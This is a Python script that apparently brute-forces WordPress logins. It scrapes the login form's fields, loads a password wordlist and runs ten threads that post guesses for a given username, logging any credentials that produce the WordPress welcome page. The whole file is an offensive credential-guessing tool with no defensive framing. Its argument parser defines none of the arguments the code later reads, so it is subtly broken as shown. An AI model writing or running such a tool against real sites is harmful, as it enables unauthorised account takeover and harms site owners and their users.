import argparse
import logging
import queue
import threading
import time
from pathlib import Path

import requests
from bs4 import BeautifulSoup

logging.basicConfig(format='', level=logging.DEBUG)
LOGGER: logging.Logger = logging.getLogger(__name__)

passwords_queue: queue.Queue = queue.Queue()

SUCCESS: str = 'Welcome to WordPress!'

def arguments() -> argparse.Namespace:
    parser: argparse.ArgumentParser = argparse.ArgumentParser()
    args: argparse.Namespace= parser.parse_args()
    return args

def get_parameters(response:requests.Response) -> dict:
    params: dict = {}
    soup: BeautifulSoup = BeautifulSoup(response.content, 'html.parser')
    for element in soup.find_all('input'):
        name = element.get('name')
        if name is not None:
            params[name] = element.get('value', None)
    LOGGER.debug(f'{params}')
    return params

def get_wordlist(wordlist:Path) -> None:
    with open(wordlist, 'r') as wl:
        words: str = wl.read()
        for word in words.split():
            passwords_queue.put(word)
    LOGGER.debug('Wordlist was successfully populated!')

def sender(session:requests.Session, url:str, params:dict, stop_event:threading.Event) -> None:
    while not passwords_queue.empty() and not stop_event.is_set():
        time.sleep(3)
        passwd = passwords_queue.get()
        params['pwd'] = passwd
        LOGGER.info(f'Trying {params["log"]}:{params["pwd"]}')

        brute_response : requests.Response = session.post(url, data=params, timeout=10)
        if response_analyzer(brute_response, username=params['log'], passwd=params['pwd']):
            stop_event.set()

def response_analyzer(response:requests.Response, username:str, passwd:str) -> bool:
    if SUCCESS in response.content.decode():
        LOGGER.info(f'Valid credentials were found: {username}:{passwd}')
        return True
    return False

def run(args, stop_event) -> None:
    session : requests.Session = requests.Session()

    params_response : requests.Response = session.get(args.url, timeout=10)
    params: dict = get_parameters(params_response)
    params['log'] = args.username

    sender(session=session, url=args.url, params=params, stop_event=stop_event)
    session.close()

def main() -> None:
    args : argparse.Namespace = arguments()

    get_wordlist(args.wordlist)

    stop_event: threading.Event = threading.Event()
    threads: list[threading.Thread] = []
    for _ in range(10):
        t: threading.Thread = threading.Thread(target=run, args=[args, stop_event])
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

if __name__ == '__main__':
    main()
